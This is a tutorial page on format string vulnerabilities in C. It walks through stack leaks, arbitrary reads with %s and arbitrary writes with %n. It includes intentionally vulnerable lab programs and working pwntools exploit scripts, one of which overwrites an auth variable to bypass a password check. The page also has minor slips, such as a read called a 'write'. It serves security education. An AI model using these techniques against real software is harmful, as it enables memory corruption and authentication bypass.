---
description: Reading memory off the stack
---

# Format String Bug

Format String is a dangerous bug that is easily exploitable. If manipulated correctly, you can leverage it to perform powerful actions such as reading from and writing to arbitrary memory locations.

### Why it exists

In C, certain functions can take "format specifier" within strings. Let's look at an example:

```c
int value = 1205;

printf("Decimal: %d\nFloat: %f\nHex: 0x%x", value, (double) value, value);
```

This prints out:

```text
Decimal: 1205
Float: 1205.000000
Hex: 0x4b5
```

So, it replaced `%d` with the value, `%f` with the float value and `%x` with the hex representation.

This is a nice way in C of formatting strings \(string concatenation is quite complicated in C\). Let's try print out the same value in hex 3 times:

```c
int value = 1205;

printf("%x %x %x", value, value, value);
```

As expected, we get

```text
4b5 4b5 4b5
```

What happens, however, if we _don't have enough arguments for all the format specifiers_?

```c
int value = 1205;

printf("%x %x %x", value);
```

```text
4b5 5659b000 565981b0
```

Erm... what happened here?

The key here is that `printf` expects as many parameters as format string specifiers, and in 32-bit it grabs these parameters from the stack. If there aren't enough parameters on the stack, it'll just _grab the next values_ - essentially _leaking values off the stack_. And that's what makes it so dangerous.

### How to abuse this

Surely if it's a bug in the code, the attacker can't do much, right? Well the real issue is when C code takes user-provided input and prints it out using `printf`.

{% file src="../.gitbook/assets/fmtstr\_arb\_read.zip" caption="Format String" %}

```c
#include <stdio.h>

int main(void) {
    char buffer[30];
    
    gets(buffer);

    printf(buffer);
    return 0;
}
```

If we run this normally, it works at expected:

```text
$ ./test 

yes
yes
```

But what happens if we input format string specifieres, such as `%x`?

```text
$ ./test

%x %x %x %x %x
f7f74080 0 5657b1c0 782573fc 20782520
```

It reads values off the stack and returns them!

### Choosing Offsets

To print the same value 3 times, using

```c
printf("%x %x %x", value, value, value);
```

Gets tedious - so, there is a better way in C.

```c
printf("%1$x %1$x %1$x", value);
```

The `1$` between tells printf to use the **first parameter**. However, this also means that attackers can read values an arbitrary offset from the top of the stack - say we know there is a canary at the 6th `%p` - instead of sending `%p %p %p %p %p %p` we can just do `%6$p`. This allows us to be much more efficient.

### Arbitrary Reads

In C, when you want to use a string you use a **pointer** to the start of the string - this is essentially a value that represents a memory address. So when you use the `%s` format specifier, it's the _pointer_ that gets passed to it. That means instead of reading a value of the stack, you read _the value in the memory address it points at_.

Now this is all very _interesting_ - if you can find a value on the stack that happens to correspond to where you want to read, that is. But what if we could specify where we want to read? Well... we can.

Let's look back at the previous program and its output:

```text
$ ./test

%x %x %x %x %x %x
f7f74080 0 5657b1c0 782573fc 20782520 25207825
```

You may notice that the last two values contain the hex values of `%x` . That's because we're reading the buffer. Here it's at the 4th offset - if we can write an address then point `%s` at it, we can get an arbitrary write!

```text
$ ./vuln 

ABCD|%6$p
ABCD|0x44434241
```

> Note: `%p` is a pointer; generally, it returns the same as `%x` just precedes it with a `0x` which makes it stand out more

As we can see, we're reading the value we inputted. Let's write a quick pwntools script that write the location of the ELF file and reads it with `%s` - if all goes well, it should read the first bytes of the file, which is always `\x7fELF`. Start with the basics:

```python
from pwn import *

p = process('./vuln')

payload = p32(0x41424344)
payload += b'|%6$p'

p.sendline(payload)
log.info(p.clean())
```

```text
$ python3 exploit.py

[+] Starting local process './vuln': pid 3204
[*] b'DCBA|0x41424344'
```

Nice it works. The base address of the binary is `0x8048000`, so let's replace the `0x41424344` with that and read it.

It doesn't work.

The reason it doesn't work is that `printf` stops at null bytes, and the very first character is a null byte. We can to put the format specifier first.

```python
from pwn import *

p = process('./vuln')

payload = b'%8$p||||'
payload += p32(0x8048000)

p.sendline(payload)
log.info(p.clean())
```

Let's break down the payload:

* We add 4 \| because we want the address we write to fill one memory address, not half of one and half another, because that will result in reading the wrong address
* The offset is `%8$p` because the start of the buffer is generally at `%6$p`. However, memory addresses are 4 bytes long each and we already have 8 bytes, so it's two memory addresses further along at `%8$p`. 

```text
$ python3 exploit.py

[+] Starting local process './vuln': pid 3255
[*] b'0x8048000||||'
```

> It still stops at the null byte, but that's not important because we get the output; the address is still written to memory, just not printed back.

Now let's replace the `p` with an `s`.

```text
$ python3 exploit.py

[+] Starting local process './vuln': pid 3326
[*] b'\x7fELF\x01\x01\x01||||'
```

Of course, `%s` will **also** stop at a null byte as strings in C are terminated with them. We have worked out, however, that the first bytes of an ELF file up to a null byte are `\x7fELF\x01\x01\x01`.

### Arbitrary Writes

Luckily C contains a rarely-used format specifier `%n`. This specifier takes in a pointer \(memory address\) and writes there the _number of characters written so far_. If we can control the input, we can control how many characters are written an also where we write them.

Obviously, there is a _small_ flaw - to write, say, `0x8048000` to a memory address, we would have to write that many characters - and generally buffers aren't quite that big. Luckily there are other format string specifiers for that. I fully recommend you watch [this video](https://www.youtube.com/watch?v=t1LH9D5cuK4) to completely understand it, but let's jump into a basic binary.

{% file src="../.gitbook/assets/fmtstr\_arb\_write.zip" caption="Format String - Arbitrary Write" %}

```c
#include <stdio.h>

int auth = 0;

int main() {
    char password[100];

    puts("Password: ");
    fgets(password, sizeof password, stdin);
    
    printf(password);
    printf("Auth is %i\n", auth);

    if(auth == 10) {
        puts("Authenticated!");
    }
}
```

Simple - we need to overwrite the variable `auth` with the value 10. Format string vulnerability is obvious, but there's also no buffer overflow due to a secure `fgets`.

#### Work out the location of auth

As it's a global variable, it's within the binary itself. We can check the location using `readelf` to check for symbols.

```text
$ readelf -s auth | grep auth
    34: 00000000     0 FILE    LOCAL  DEFAULT  ABS auth.c
    57: 0804c028     4 OBJECT  GLOBAL DEFAULT   24 auth
```

Location of `auth` is `0x0804c028`.

#### Writing the Exploit

We're lucky there's no null bytes, so there's no need to change the order.

```text
$ ./auth 

Password: 
%p %p %p %p %p %p %p %p %p
0x64 0xf7f9f580 0x8049199 (nil) 0x1 0xf7ff5980 0x25207025 0x70252070 0x20702520
```

Buffer is the 7th `%p`.

```python
from pwn import *

AUTH = 0x804c028

p = process('./auth')

payload = p32(AUTH)
payload += b'|' * 6         # We need to write the value 10, AUTH is 4 bytes, so we need 6 more for %n
payload += b'%7$n'


print(p.clean().decode('latin-1'))
p.sendline(payload)
print(p.clean().decode('latin-1'))
```

And easy peasy:

```text
[+] Starting local process './auth': pid 4045
Password: 

[*] Process './auth' stopped with exit code 0 (pid 4045)
(À\x04||||||
Auth is 10
Authenticated!
```

### Pwntools

As you can expect, pwntools has a handy feature for automating `%n` format string exploits:

```python
payload = fmtstr_payload(offset, {location : value})
```

The `offset` in this case is `7` because the 7th `%p` read the buffer; the location is **where** you want to write it and the value is **what**. Note that you can add as many location-value pairs into the dictionary as you want.

```python
payload = fmtstr_payload(7, {AUTH : 10})
```

You can also grab the location of the `auth` symbol with pwntools:

```python
elf = ELF('./auth')
AUTH = elf.sym['auth']
```

> Check out the pwntools tutorials for more cool features

